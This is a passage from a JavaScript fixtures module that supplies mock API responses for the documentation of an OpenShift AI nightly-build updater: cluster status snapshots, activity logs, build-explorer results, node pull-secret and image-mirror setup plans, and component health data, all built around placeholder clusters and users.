// Docs mock API fixtures. Structures mirror JSON from the live service:
// pkg/types/types.go, pkg/api (OperationStatus, VersionInfo,
// UpdateInfo, UpdateStep) and pkg/cluster (DiagnosticsResponse). Files
// under ./diagnostics are emitted by the Go backend (make docs-fixtures).
// Placeholder identities only: cluster example-cluster, user dev-user.
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));

/** Screenshot timeline anchor; Playwright aligns the browser clock to the same instant. */
/** The Workbench tab (GET /api/resources/workbench): what Set up would create, and this tool's workbench in states. */
export const workbenchPlan = {
  image: "Jupyter | Minimal | CPU | Python 3.12", imageStream: "s2i-minimal-notebook", imageTag: "2025.2",
  hardwareProfile: "Default", hardwareProfileName: "redhat-ods-applications/default-profile", cpu: "2", memory: "4Gi",
  storageSize: "20Gi", storageClass: "gp3-csi", connection: true, pipelines: true, mlflow: false,
};
export const WORKBENCH_NO_PROFILE = "No enabled hardware profile is offered for workbenches. A cluster-admin enables one in the dashboard (Settings, Hardware profiles).";
export function workbenchItem(ns, state) {
  return {
    deployed: true, ready: state === "running", namespace: ns, name: "nightly-workbench", managedByTool: true, uid: "3f1c2b9e-workbench",
    state, url: `${DASHBOARD_URL}/notebook/${ns}/nightly-workbench`,
    image: "Jupyter | Minimal | CPU | Python 3.12 (2025.2)", hardwareProfile: "Default", cpu: "2", memory: "4Gi", connectionAttached: true,
    storage: { name: "nightly-workbench-storage", size: "20Gi", storageClass: "gp3-csi", managedByTool: true },
  };
}

export const NOW = Date.parse("2026-10-06T14:30:00Z");

/** Returns an RFC 3339 timestamp `minutes` earlier than NOW. */
export const ago = (minutes) => new Date(NOW - minutes * 60_000).toISOString().replace(/\.\d{3}Z$/, "Z");

/** Seed-based digest string that looks like a real image reference. */
export const digest = (seed) => "sha256:" + createHash("sha256").update(seed).digest("hex");
export const hex = (seed, n) => createHash("sha1").update(seed).digest("hex").slice(0, n);

export const USER = "dev-user";
// pkg/api writeAuthError and sessionProblem (scopeRefusal): expired or revoked
// sessions, plus sign-ins predating 4.0.0 that cannot authorize mutations.
export const SESSION_EXPIRED_MESSAGE = "Your OpenShift session has expired. Log in again.";
export const SIGN_IN_SCOPE_MESSAGE = "Your sign-in cannot make changes: it was made before this updater acted with your own OpenShift permissions. Log out and log in again.";
const APPS = "apps.example-cluster.example.com";
export const CONSOLE_URL = `https://console-openshift-console.${APPS}`;
// Dashboard CR status.url for a release routed via the data-science gateway.
export const DASHBOARD_URL = `https://rh-ai.${APPS}`;
const FBC = "quay.io/rhoai/rhoai-fbc-fragment";
const fbc = (tag, seed) => `${FBC}:${tag}@${digest(seed)}`;

// rhoai-3.6 catalog tags: presently installed versus newest nightly.
const installedBuild = { tag: "rhoai-3.6", seed: "rhoai-3.6-2026-10-04", buildDate: ago(60 * 59 + 17) };
const latestBuild = { tag: "rhoai-3.6", seed: "rhoai-3.6-2026-10-06", buildDate: ago(60 * 11 + 22) };
export const INSTALLED_IMAGE = fbc(installedBuild.tag, installedBuild.seed);
export const LATEST_IMAGE = fbc(latestBuild.tag, latestBuild.seed);

const nightlyBuild = (b, dashboardCommit) => ({
  image: fbc(b.tag, b.seed),
  tag: b.tag,
  digest: digest(b.seed),
  buildDate: b.buildDate,
  dashboardCommit,
  dashboardGitURL: "https://github.com/red-hat-data-services/odh-dashboard",
});

// --- Activity log (backend ordering: newest first) ----------------------------

const updateEntry = (minutesAgo, b) => ({
  timestamp: ago(minutesAgo), user: USER, action: "update", detail: fbc(b.tag, b.seed), success: true,
  label: "Updated to nightly", category: "operator", build: `${b.tag} · ${digest(b.seed).slice(7, 19)}`,
});
const olderActivity = [
  { timestamp: ago(60 * 27), user: USER, action: "setup-pipeline-server", detail: "Project dev-project", success: true, label: "Pipeline server set up", category: "test-resources" },
  { timestamp: ago(60 * 27 + 5), user: USER, action: "setup-s3", detail: "S3 storage in namespace seaweedfs", success: true, label: "S3 storage set up", category: "test-resources" },
  { timestamp: ago(60 * 50), user: "qa-user", action: "deploy-dashboard-pr", detail: "PR #5123 (RHOAI build)", success: true, label: "Dashboard PR deployed", category: "dashboard-dev" },
  { timestamp: ago(60 * 51), user: "qa-user", action: "revert-dashboard", detail: "Restored the release images", success: true, label: "Dashboard reverted", category: "dashboard-dev" },
  { timestamp: ago(60 * 74), user: USER, action: "update", detail: fbc("rhoai-3.6", "rhoai-3.6-2026-10-03"), success: false, reason: "The catalog image could not be pulled: unauthorized. Nothing was changed.", label: "Updated to nightly", category: "operator", build: `rhoai-3.6 · ${digest("rhoai-3.6-2026-10-03").slice(7, 19)}` },
  { timestamp: ago(60 * 75), user: USER, action: "create-pull-secret", detail: "kube-system/additional-pull-secret", success: true, label: "Pull secret configured", category: "setup" },
];
/** Activity entries after moving to build b; newest first; ended `minutesAgo` ago. */
const activityAfter = (b, minutesAgo) => [updateEntry(minutesAgo, b), ...(b === installedBuild ? [] : [updateEntry(60 * 26, installedBuild)]), ...olderActivity];

// --- GET /api/status (cluster health snapshot) --------------------------------

/** Healthy: latest nightly landed `updatedMinutesAgo` minutes before NOW. */
export function healthyStatus(updatedMinutesAgo = 60 * 10) {
  return {
    cluster: { server: "https://api.example-cluster.example.com:443", version: "4.20.6", user: USER, controlPlane: "hosted" },
    subscription: { name: "rhods-operator", source: "rhoai-catalog-dev", channel: "stable-3.x", state: "AtLatestKnown" },
    csv: { name: "rhods-operator.3.6.0", version: "3.6.0", phase: "Succeeded" },
    catalogSource: { exists: true, name: "rhoai-catalog-dev", image: LATEST_IMAGE, state: "READY" },
    // ROSA HCP: the internal registry's copy of the token (workbench images).
    pullSecret: { exists: true, valid: true, registry: { name: "rhoai-nightly-updater-pull", namespace: "redhat-ods-applications", exists: true, ours: true, current: true } },
    imageMirror: { exists: true, name: "rhoai-quay-mirror", source: "registry.redhat.io/rhoai" },
    installPlan: { name: "install-7xk2p", phase: "Complete", approved: true },
    catalogPod: { name: "rhoai-catalog-dev-q8z4n", phase: "Running", ready: true, restartCount: 0 },
    stableSource: "redhat-operators",
    consoleURL: CONSOLE_URL,
    dashboardURL: DASHBOARD_URL,
    stableChannel: "stable-3.x",
    stableVersion: "3.5.1",
    dscExists: true,
    nightly: {
      installed: nightlyBuild(latestBuild, "8c41d0e2a7b95f13d6e0c4a8b2f7e1d9c3a5b604"),
      latest: nightlyBuild(latestBuild, "8c41d0e2a7b95f13d6e0c4a8b2f7e1d9c3a5b604"),
      updateAvailable: false,
      checkedAt: ago(4),
    },
    activity: activityAfter(latestBuild, updatedMinutesAgo),
  };
}

/** Install lags by two days while a fresher rhoai-3.6 image is available. */
export function updateAvailableStatus() {
  const s = healthyStatus();
  s.catalogSource.image = INSTALLED_IMAGE;
  s.nightly.installed = nightlyBuild(installedBuild, "3f9e7b1c5d2a8e406b1f9c3d7a2e5b8f0c6d4a19");
  s.nightly.updateAvailable = true;
  s.activity = activityAfter(installedBuild, 60 * 26);
  return s;
}

export function operatorFailedStatus() {
  const s = updateAvailableStatus();
  s.csv.phase = "Failed";
  s.subscription.state = "AtLatestKnown";
  s.installPlan = { name: "install-m4w9t", phase: "Complete", approved: true };
  return s;
}

/** CSV still running even though the Subscription resource is gone. */
export function noSubscriptionStatus() {
  const s = updateAvailableStatus();
  s.subscription = { name: "", source: "", channel: "", state: "" };
  delete s.installPlan;
  delete s.nightly;
  return s;
}

/** Pristine cluster that has not run one-time setup yet. */
export function freshStatus() {
  const s = healthyStatus();
  s.subscription = { name: "", source: "", channel: "", state: "" };
  s.csv = { name: "", version: "", phase: "Not Found" };
  s.catalogSource = { exists: false, name: "", image: "", state: "" };
  s.pullSecret = { exists: false, valid: false };
  s.imageMirror = { exists: false, name: "", source: "" };
  s.dscExists = false;
  delete s.installPlan;
  delete s.catalogPod;
  delete s.nightly;
  s.activity = [];
  return s;
}

/** One-time setup complete; operator stack not installed. */
export function readyToInstallStatus() {
  const s = freshStatus();
  s.pullSecret = { exists: true, valid: true };
  s.imageMirror = { exists: true, name: "rhoai-quay-mirror", source: "registry.redhat.io/rhoai" };
  s.activity = [olderActivity[5]];
  return s;
}

/**
 * Node pull-secret command text for self-managed clusters—the embedded backend
 * script (pkg/cluster/internal/rhoai/node_pull_secret.sh, NodePullSecretCommand).
 */
export const NODE_PULL_SECRET_COMMAND = readFileSync(join(here, "../../../pkg/cluster/internal/rhoai/node_pull_secret.sh"), "utf8").trim();

/** Companion removal script (pkg/cluster/internal/rhoai/node_pull_secret_remove.sh, NodePullSecretRemoveCommand). */
export const NODE_PULL_SECRET_REMOVE_COMMAND = readFileSync(join(here, "../../../pkg/cluster/internal/rhoai/node_pull_secret_remove.sh"), "utf8").trim();

/**
 * Clusters where nodes consume openshift-config/pull-secret and status exposes
 * pullSecret.nodes: self-managed (controlPlane "self-managed"), Red Hat-hosted
 * (managed: "managed", ROSA Classic or OSD), or unknown platform (field omitted).
 */
export function selfManaged(s, { known = true, pulled = false, managed = false, addedByTool } = {}) {
  if (known) s.cluster.controlPlane = managed ? "managed" : "self-managed";
  else delete s.cluster.controlPlane;
  // Only a hosted control plane reports the internal registry's copy.
  const { registry: _registry, ...pullSecret } = s.pullSecret;
  s.pullSecret = { ...pullSecret, nodes: { command: NODE_PULL_SECRET_COMMAND, removeCommand: NODE_PULL_SECRET_REMOVE_COMMAND, pulled, ...(addedByTool ? { addedByTool } : {}) } };
  return s;
}

/** Audit row for a tool-owned pull-secret key (pullSecret.nodes.addedByTool). */
export const NODE_PULL_RECORD = { at: "2026-11-18T10:00:00Z", by: "kube:admin", sameToken: true };

/**
 * Parent-scope refusal when corp-mirrors already redirects all of registry.redhat.io
 * (pkg/cluster/internal/node/node_setup_mirrors.go ParentScopeRefusal, copy for
 * ImageDigestMirrorSet corp-mirrors).
 */
export const MIRROR_PARENT_SCOPE_REFUSAL = "ImageDigestMirrorSet corp-mirrors maps registry.redhat.io to mirror.corp.example/redhat, so pulls of registry.redhat.io/rhoai images by digest go to mirror.corp.example/redhat/rhoai now. The nodes use only the mirrors of the most specific source that matches an image, and the Machine Config Operator copies a mirror to a namespace inside its source only while that namespace has no mirror of its own. Creating ImageDigestMirrorSet rhoai-quay-mirror, a mirror for exactly registry.redhat.io/rhoai, would take those pulls away from that mirror: pulls by digest would go to quay.io/rhoai, then to registry.redhat.io itself. So it is not created. Nothing was changed. To keep that mirror in use, the cluster's administrator adds an entry for registry.redhat.io/rhoai to that object, in spec.imageDigestMirrors of ImageDigestMirrorSet corp-mirrors: source registry.redhat.io/rhoai, mirrors mirror.corp.example/redhat/rhoai, quay.io/rhoai (that also sets up the image mirror). Or whoever runs that mirror makes it carry the nightly images at that path.";

/**
 * POST /api/setup/nodes/plan response shape (pkg/cluster/internal/node/node_setup.go):
 * w.nodes models pull state (pullEntry "none", "same" with saved token, or
 * "other" for foreign credentials); mirror metadata mirrors status.imageMirror.
 */
export function nodeSetupPlan(w, action, replaceExisting = false) {
  const cp = w.status.cluster.controlPlane;
  const plan = { action, ready: false, state: "" };
  if (cp) plan.controlPlane = cp;
  const mirror = action.startsWith("mirror-");
  const refuse = (code, refusal) => ({ ...plan, refusalCode: code, refusal });
  if (cp === "hosted") {
    return refuse("hosted", mirror
      ? "This cluster has a hosted control plane (ROSA HCP): its image mirror is configured through OpenShift Cluster Manager with rosa create image-mirror, not with an object in the cluster. Nothing was changed."
      : "This cluster has a hosted control plane (ROSA HCP): its nodes get kube-system/additional-pull-secret, which the Pull secret item sets. HyperShift merges it with the cluster's own pull secret for the nodes of AWS and Azure node pools that replace their nodes on an update (not in-place ones); where both have a quay.io/rhoai entry, the cluster's own wins. Nothing was changed.");
  }
  if (cp === "managed" && !mirror) {
    return refuse("managed", "Red Hat runs this cluster (ROSA Classic or OpenShift Dedicated). Red Hat creates its cluster pull secret, and the documentation of these services has no procedure for changing it, so the updater does not change it. The command under Do it yourself instead does it, if you choose to. Nothing was changed.");
  }
  // Platform type unknown (webhooks unreadable): block pull-secret work but still
  // evaluate mirror plans.
  if (!cp && !mirror) {
    return refuse("unknown_platform", "The updater cannot list the validating webhook configurations (list validating webhook configurations: k8s API error 403 (Forbidden)), so it cannot tell whether Red Hat runs this cluster (ROSA Classic or OpenShift Dedicated), where it does not change the cluster pull secret. Nothing was changed. The command under Do it yourself instead does it, if you choose to.");
  }
  if (action === "mirror-create" && w.parentScopeMirror) {
    return refuse("parent_scope", MIRROR_PARENT_SCOPE_REFUSAL);
  }
  if (!cp && w.nodeSetupDenied) {
    return refuse("forbidden", "The cluster refused it in a dry run: admission webhook \"imagecontentpolicies-validation.managed.openshift.io\" denied the request: Managed OpenShift customers may not create ImageContentSourcePolicy, ImageDigestMirrorSet, or ImageTagMirrorSet resources that configure mirrors that would conflict with system registries. Nothing was changed. Your account, or an admission policy of this cluster, does not allow it: use the instructions under Do it yourself instead, or ask the cluster's administrator.");
  }
  const pools = w.stuckPools?.length ? { pools: w.stuckPools } : {};
  const im = w.status.imageMirror;
  const entry = w.nodes?.pullEntry ?? "none";
  switch (action) {
    case "mirror-create":
      if (im.exists) return { ...plan, nothingToDo: true, state: `${im.kind ?? "ImageDigestMirrorSet"} ${im.name} already redirects registry.redhat.io/rhoai to quay.io/rhoai, so the mirror is set up.` };
      return { ...plan, ...pools, ready: true, state: "No ImageDigestMirrorSet or ImageContentSourcePolicy redirects registry.redhat.io/rhoai to quay.io/rhoai.",
        changes: ["Create ImageDigestMirrorSet rhoai-quay-mirror (cluster-wide): pulls of registry.redhat.io/rhoai images by digest go to quay.io/rhoai."],
        nodeImpact: "The Machine Config Operator adds the mirror to /etc/containers/registries.conf on every node and reloads CRI-O, without draining or rebooting them: a new digest-only mirror is one of the changes OpenShift applies without a drain. oc get mcp shows UPDATED True for every pool once all nodes have it.",
        undo: "Remove the image mirror (the same item offers it once it exists), or oc delete imagedigestmirrorset rhoai-quay-mirror. Removing it drains the nodes, one node at a time by default (the pool's maxUnavailable)." };
    case "mirror-remove":
      if (!im.exists) return { ...plan, nothingToDo: true, state: "No ImageDigestMirrorSet or ImageContentSourcePolicy redirects registry.redhat.io/rhoai to quay.io/rhoai." };
      return { ...plan, ...pools, ready: true, uid: "3f6c1d2e-mock", resourceVersion: "51234", state: "ImageDigestMirrorSet rhoai-quay-mirror redirects registry.redhat.io/rhoai to quay.io/rhoai.",
        changes: ["Delete ImageDigestMirrorSet rhoai-quay-mirror (cluster-wide)."],
        nodeImpact: "The Machine Config Operator removes the mirror from every node. Removing a mirror drains each node first (its pods are evicted and start again on other nodes), then reloads CRI-O and makes the node schedulable again, without a reboot, one node at a time by default (the pool's maxUnavailable); a single-node cluster is not drained. A PodDisruptionBudget that allows no eviction holds a node's drain: the machine config daemon waits up to an hour for it, then fails that node's update (event FailedToDrain). After that, registry.redhat.io/rhoai images are pulled from registry.redhat.io again, where nightly builds do not exist: installing or updating a nightly fails until the mirror is back. Images already on a node stay.",
        undo: "Create the image mirror again (one click, no drain)." };
    case "pull-secret-add": {
      const keys = entry === "none" ? {} : { existingKeys: ["quay.io/rhoai"] };
      if (entry === "same") return { ...plan, ...keys, entrySetBy: "tool", nothingToDo: true, state: "openshift-config/pull-secret already has the quay.io/rhoai entry this tool added on 2026-11-18T10:00:00Z by kube:admin, with the token saved under Pull secret, so the nodes have it (or get it as their pools update)." };
      const kept = "the other 4 registry logins stay as they are";
      const nodeImpact = "The Machine Config Operator writes the new cluster pull secret to every node of each machine config pool, one node at a time by default (the pool's maxUnavailable), without draining or rebooting them (OpenShift applies pull secret changes that way). oc get mcp shows UPDATED True for every pool once all nodes have it; the kubelet uses it for the next pulls.";
      if (entry === "other" && !replaceExisting) {
        return { ...plan, ...keys, entrySetBy: "other", replaceable: true, resourceVersion: "48211", uid: "7c2a9e10-mock", refusalCode: "foreign_entry",
          refusal: "openshift-config/pull-secret already has a quay.io/rhoai entry (quay.io/rhoai) that this tool did not add (this tool has no record of adding it), with another token. It is not replaced: if that entry works, the nodes need nothing more, and Check that the nodes can pull tells. Nothing was changed. To replace it anyway, acknowledge that its token is not kept and that this tool cannot restore it." };
      }
      if (entry === "other") {
        return { ...plan, ...pools, ...keys, entrySetBy: "other", replacing: true, ready: true, resourceVersion: "48211", uid: "7c2a9e10-mock",
          state: "openshift-config/pull-secret has a quay.io/rhoai entry (quay.io/rhoai) that this tool did not add (this tool has no record of adding it), with another token.",
          changes: [`Secret openshift-config/pull-secret: replace its quay.io/rhoai entry (quay.io/rhoai), which this tool did not add, with one that has the token saved under Pull secret; ${kept}.`],
          nodeImpact,
          undo: "The token it has now is not kept, and this tool cannot restore it: only whoever set it up has it (on a provisioned cluster, its provisioner). Remove from the nodes' pull secret then takes out the entry this tool added, which leaves the nodes without a quay.io/rhoai login." };
      }
      return { ...plan, ...pools, entrySetBy: "none", ready: true, resourceVersion: "48211", uid: "7c2a9e10-mock",
        state: "openshift-config/pull-secret has no quay.io/rhoai entry.",
        changes: [`Secret openshift-config/pull-secret: add a quay.io/rhoai entry with the token saved under Pull secret; ${kept}.`],
        nodeImpact,
        undo: "Remove from the nodes' pull secret (the same item offers it): it removes only the entry this tool added." };
    }
    default:
      if (entry === "none") return { ...plan, entrySetBy: "none", nothingToDo: true, state: "openshift-config/pull-secret has no quay.io/rhoai entry." };
      if (entry === "other") {
        return { ...plan, entrySetBy: "other", existingKeys: ["quay.io/rhoai"], resourceVersion: "48211", uid: "7c2a9e10-mock", refusalCode: "not_owned",
          refusal: "The quay.io/rhoai entry in openshift-config/pull-secret was not added by this tool (or was changed since), so it is not removed here (this tool has no record of adding it). Nothing was changed. To remove it by hand, as a cluster-admin, run the removal command under Do it yourself instead: it removes whatever quay.io/rhoai entry is there, so first make sure the nodes do not need it." };
      }
      return { ...plan, ...pools, entrySetBy: "tool", existingKeys: ["quay.io/rhoai"], ready: true, resourceVersion: "48211", uid: "7c2a9e10-mock", state: "openshift-config/pull-secret has the quay.io/rhoai entry this tool added on 2026-11-18T10:00:00Z by kube:admin.",
        changes: ["Secret openshift-config/pull-secret: remove the quay.io/rhoai entry this tool added; the other 4 registry logins stay as they are."],
        nodeImpact: "The Machine Config Operator writes the new cluster pull secret to every node of each machine config pool, one node at a time by default (the pool's maxUnavailable), without draining or rebooting them (OpenShift applies pull secret changes that way). oc get mcp shows UPDATED True for every pool once all nodes have it; the kubelet uses it for the next pulls. After that the nodes cannot pull from quay.io/rhoai: images already on a node stay and running pods keep running, but a new nightly, or a pod that starts on a node without its image, fails with an unauthorized pull error.",
        undo: "Add to the nodes' pull secret again (it copies the token saved under Pull secret)." };
  }
}

/** SSE steps from POST /api/setup/nodes/stream after the plan is ready. */
export function nodeSetupSteps(plan) {
  const done = {
    "mirror-create": "Created ImageDigestMirrorSet rhoai-quay-mirror.",
    "mirror-remove": "Deleted ImageDigestMirrorSet rhoai-quay-mirror.",
    "pull-secret-add": "Added the quay.io/rhoai entry to openshift-config/pull-secret.",
    "pull-secret-remove": "Removed the quay.io/rhoai entry from openshift-config/pull-secret.",
  }[plan.action];
  const note = "The nodes take it one node at a time by default (the pool's maxUnavailable): oc get mcp shows UPDATED True for every pool once all have it.";
  return [
    { step: "check", status: "running", message: "Reading what is on the cluster" },
    { step: "check", status: "success", message: plan.state },
    { step: "dry_run", status: "running", message: "Asking the API server to check the change (dry run)" },
    { step: "dry_run", status: "success", message: "The API server accepts it" },
    { step: "apply", status: "running", message: plan.changes.join(" ") },
    { step: "apply", status: "success", message: done },
    { step: "verify", status: "running", message: "Reading it back" },
    { step: "verify", status: "success", message: note },
    { step: "operation_complete", status: "success", message: `${done} ${note}` },
  ];
}

/** Body returned by POST /api/setup/node-pull-check. */
export const nodePullCheck = (image, ok) => ok
  ? { success: true, message: `A temporary catalog pod pulled ${image} with the nodes' pull secret, and was removed again. A node whose machine config pool is still updating may not have the credentials yet: oc get mcp shows UPDATED True for every pool when they all do.`, logs: [] }
  : { success: false, errorCode: "catalog_image_pull", message: `The catalog image ${image} cannot be pulled (ErrImagePull: unauthorized: access to the requested resource is not authorized). This cluster is self-managed: its nodes pull with the cluster pull secret, openshift-config/pull-secret, not with additional-pull-secret, which only the updater uses here. A cluster-admin adds the quay.io/rhoai entry with the command under Pull secret in the cluster setup (Status page); the nodes pick it up within a few minutes. Also check that the image exists.`, logs: [] };

/** Fresh operator install without a DataScienceCluster resource. */
export function noDSCStatus() {
  const s = healthyStatus(0);
  s.dscExists = false;
  s.activity = [updateEntry(0, latestBuild), olderActivity[5]];
  return s;
}

export const latestNightly = () => ({ tag: "rhoai-3.6", image: LATEST_IMAGE, digest: digest(latestBuild.seed), buildDate: latestBuild.buildDate });

// --- Build Explorer (catalog bundles) -----------------------------------------

const tagBuilds = [
  { tag: "rhoai-3.7-ea.1", seed: "rhoai-3.7-ea.1-2026-10-06", buildDate: ago(60 * 9 + 41) },
  latestBuild,
  { tag: "rhoai-3.6-ea.2", seed: "rhoai-3.6-ea.2-2026-09-18", buildDate: ago(60 * 24 * 18 + 200) },
  { tag: "rhoai-3.5", seed: "rhoai-3.5-2026-10-05", buildDate: ago(60 * 33 + 5) },
  { tag: "rhoai-3.4", seed: "rhoai-3.4-2026-10-05", buildDate: ago(60 * 35 + 48) },
  { tag: "rhoai-3.3", seed: "rhoai-3.3-2026-09-29", buildDate: ago(60 * 24 * 7 + 95) },
];

export const nightlyTags = (withDates = true) => ({
  tags: tagBuilds.map((b) => ({ tag: b.tag, image: fbc(b.tag, b.seed), ...(withDates ? { buildDate: b.buildDate } : {}) })),
});

const relatedImageDefs = [
  ["odh_dashboard_image", "core", "odh-dashboard"],
  ["odh_rhel9_operator_image", "core", "rhods-operator"],
  ["odh_model_controller_image", "core", "odh-model-controller"],
  ["odh_kserve_controller_image", "core", "kserve"],
  ["odh_notebook_controller_image", "workbench", "kubeflow"],
  ["odh_workbench_jupyter_datascience_cpu_py312_image", "workbench", "notebooks"],
  ["odh_workbench_codeserver_datascience_cpu_py312_image", "workbench", "notebooks"],
  ["odh_data_science_pipelines_operator_controller_image", "pipeline", "data-science-pipelines-operator"],
  ["odh_ml_pipelines_api_server_v2_image", "pipeline", "data-science-pipelines"],
  ["odh_trainer_image", "training", "trainer"],
  ["odh_kuberay_operator_controller_image", "training", "kuberay"],
  ["odh_model_registry_operator_image", "other", "model-registry-operator"],
  ["odh_trustyai_service_operator_image", "other", "trustyai-service-operator"],
  ["odh_mlflow_operator_image", "other", "mlflow-operator"],
  ["odh_kube_rbac_proxy_image", "infra", "kube-rbac-proxy"],
];

/** Single-image payload for GET /api/build-explorer/content. */
export function fbcContent(image) {
  const b = tagBuilds.find((t) => image === fbc(t.tag, t.seed)) ?? installedBuild;
  const isInstalled = image === INSTALLED_IMAGE;
  const relatedImages = relatedImageDefs.map(([name, category, repo], i) => {
    // Latest tag differs from installed on dashboard, KServe, and trainer images.
    const changed = !isInstalled && [0, 3, 9].includes(i);
    const seed = `${name}-${changed ? b.seed : installedBuild.seed}`;
    return {
      name,
      image: `registry.redhat.io/rhoai/${name.replace(/^odh_/, "odh-").replace(/_image$/, "").replaceAll("_", "-")}-rhel9@${digest(seed)}`,
      category,
      gitCommit: hex(seed, 40),
      gitURL: `https://github.com/red-hat-data-services/${repo}`,
      commitDate: ago(60 * (changed ? 14 : 62) + i * 7),
      buildDate: changed ? b.buildDate : installedBuild.buildDate,
      version: "3.6.0",
    };
  });
  const categories = {};
  for (const r of relatedImages) categories[r.category] = (categories[r.category] ?? 0) + 1;
  return { tag: b.tag, image, bundleName: "rhods-operator.3.6.0", relatedImages, categories };
}

/**
 * GET /api/build-explorer/contains?pr=N|commit=SHA[&repo=owner/name]. Treat every
 * repo like the dashboard mock: PRs merged 40h ago appear only in post-merge
 * main builds; release lines get cherry-picks (different SHAs). Commits use a
 * fixed rhoai-3.6 SHA from 40h ago. Images built >1h earlier yield
 * built_before_merge / built_before_commit from timestamps alone, matching prod logic.
 */
export function buildContains({ pr, commit, repo }, images) {
  repo = repo || "opendatahub-io/odh-dashboard";
  const name = repo.split("/")[1];
  const fork = `red-hat-data-services/${name}`;
  const base = pr ? hex(`merge-${pr}`, 40) : hex("commit-rhoai-3.6-2026-10-05", 40);
  const baseDate = pr ? ago(60 * 40) : ago(60 * 40 + 30);
  const subject = pr
    ? { pr: Number(pr), title: "Show the model deployment status in the project overview", url: `https://github.com/${repo}/pull/${pr}`, mergeCommit: base, mergedAt: baseDate }
    : { commit: base, commitDate: baseDate, commitTitle: "Show the model deployment status in the project overview", commitURL: `https://github.com/${fork}/commit/${base}` };
  return {
    repo,
    ...subject,
    builds: images.map((image) => {
      const b = tagBuilds.find((t) => image === fbc(t.tag, t.seed)) ?? installedBuild;
      const row = { image, tag: b.tag, installed: image === INSTALLED_IMAGE };
      const builtBefore = Date.parse(b.buildDate) < Date.parse(baseDate) - 3_600_000;
      if (builtBefore) {
        const hours = Math.round((Date.parse(baseDate) - Date.parse(b.buildDate)) / 3_600_000);
        const age = hours < 48 ? `${hours} hours` : `${Math.round(hours / 24)} days`;
        return pr
          ? { ...row, result: "not_contained", reason: "built_before_merge", message: `Built ${age} before the PR was merged.` }
          : { ...row, result: "not_contained", reason: "built_before_commit", message: `Built ${age} before the commit.` };
      }
      const buildCommit = hex(`${name}-${b.seed}`, 40);
      const contains = pr ? b.tag === "rhoai-3.7-ea.1" : b.tag === "rhoai-3.6";
      return {
        ...row, commit: buildCommit, commitRepo: fork,
        result: contains ? "contains" : "not_contained",
        compareURL: `https://github.com/${fork}/compare/${base}...${buildCommit}`,
      };
    }),
  };
}

// --- Components (DSC modules and deployments) -----------------------------------

const pod = (name, ns, extra = {}) => ({
  name, namespace: ns, phase: "Running", node: "ip-10-0-41-17.ec2.internal", ready: true, restarts: 0,
  image: "", imageID: "", age: "26h", ...extra,
});

function deployment(name, replicas, repo, extra = {}) {
  const ns = "redhat-ods-applications";
  const commit = hex(`deploy-${name}`, 40);
  const image = `registry.redhat.io/rhoai/${name}-rhel9@${digest(`img-${name}`)}`;
  return {
    name, namespace: ns, ready: replicas, desired: replicas, available: replicas, image,
    unavailableReplicas: 0, updatedReplicas: replicas, rolloutStuck: false,
    pods: Array.from({ length: replicas }, (_, i) => pod(`${name}-${hex(name, 9)}-${hex(name + i, 5)}`, ns, { image, imageID: image })),
    gitCommit: commit, gitURL: `https://github.com/red-hat-data-services/${repo}`, commitDate: ago(60 * 62), buildDate: installedBuild.buildDate, version: "3.6.0",
    ...extra,
  };
}

const componentNames = [
  ["aipipelines", "Managed"], ["dashboard", "Managed"], ["feastoperator", "Managed"], ["kserve", "Managed"],
  ["kueue", "Removed"], ["llamastackoperator", "Removed"], ["modelregistry", "Managed"], ["ray", "Managed"],
  ["trainer", "Managed"], ["trustyai", "Managed"], ["workbenches", "Managed"],
];

export function healthyComponents() {
  return {
    components: componentNames.map(([name, managementState]) => ({
      name, managementState, status: managementState === "Removed" ? "Removed" : "Available",
    })),
    deployments: [
      deployment("rhods-dashboard", 2, "odh-dashboard", { changeStatus: "updated" }),
      deployment("odh-model-controller", 1, "odh-model-controller"),
      deployment("kserve-controller-manager", 1, "kserve", { changeStatus: "updated" }),
      deployment("data-science-pipelines-operator-controller-manager", 1, "data-science-pipelines-operator"),
      deployment("notebook-controller-deployment", 1, "kubeflow"),
      deployment("odh-notebook-controller-manager", 1, "kubeflow"),
      deployment("kuberay-operator", 1, "kuberay"),
      deployment("trainer-operator-controller-manager", 1, "trainer", { changeStatus: "updated" }),
      deployment("model-registry-operator-controller-manager", 1, "model-registry-operator"),
      deployment("trustyai-service-operator-controller-manager", 1, "trustyai-service-operator"),
      deployment("feast-operator-controller-manager", 1, "feast"),
    ],
    dscName: "default-dsc",
    dscExists: true,
    dscState: "present",
    operatorVersion: "3.6.0",
    operatorPhase: "Succeeded",
    dscPhase: "Ready",
    snapshotTime: ago(60 * 26),
    changedCount: 3,
    consoleURL: CONSOLE_URL,
    dscAPIVersion: "datasciencecluster.opendatahub.io/v2",
    dscCompatibility: {
      operatorVersion: "3.6.0", invalidFields: [], missingComponents: [], extraComponents: [], defaultsSource: "csv",
      defaultsAPIVersion: "datasciencecluster.opendatahub.io/v2",
    },
  };
}

/**
 * Conversion webhook cannot lift the DSC to v3, so API reads stay on v2 while
 * bundle defaults ship as v3 only. Wording copied from pkg/cluster
 * (dsc_versions_test.go).
 */
export function conversionFallbackComponents() {
  const c = healthyComponents();
  c.dscVersionFallback = {
    version: "v3",
    used: "v2",
    message: "storage is (re)initializing: failed to list datasciencecluster.opendatahub.io/v3, Kind=DataScienceCluster: conversion webhook for datasciencecluster.opendatahub.io/v2, Kind=DataScienceCluster failed: no kind \"DataScienceCluster\" is registered for version \"datasciencecluster.opendatahub.io/v3\" in scheme \"pkg/runtime/scheme.go:111\"",
  };
  c.dscCompatibility = {
    invalidFields: [], missingComponents: [], extraComponents: [],
    defaultsError: "This DataScienceCluster can only be read as v2: reading it as v3 fails because the operator's conversion webhook cannot convert it. " +
      "Operator 3.6.0 has no DataScienceCluster v2 defaults (none in the alm-examples of rhods-operator.3.6.0 or branch rhoai-3.6 of rhods-operator); it ships them as v3 only. " +
      "Component names differ between API versions, so the DataScienceCluster is not compared with defaults of another version. " +
      "Diagnostics explains the conversion failure and how to fix it.",
  };
  return c;
}

/** Trainer blocked on missing JobSet; Ray module operator behind on generation. */
export function notReadyComponents() {
  const c = healthyComponents();
  c.dscPhase = "Not Ready";
  c.dscReason = "Some modules are not ready: ray, trainer";
  for (const comp of c.components) {
    if (comp.name === "trainer") {
      Object.assign(comp, {
        status: "Error",
        message: "dependency not met: JobSet Operator is not installed. Please install the JobSet Operator via OLM (OperatorHub) before deploying Trainer.",
        cause: "Prerequisite operator not installed: JobSet Operator",
      });
    }
    if (comp.name === "ray") {
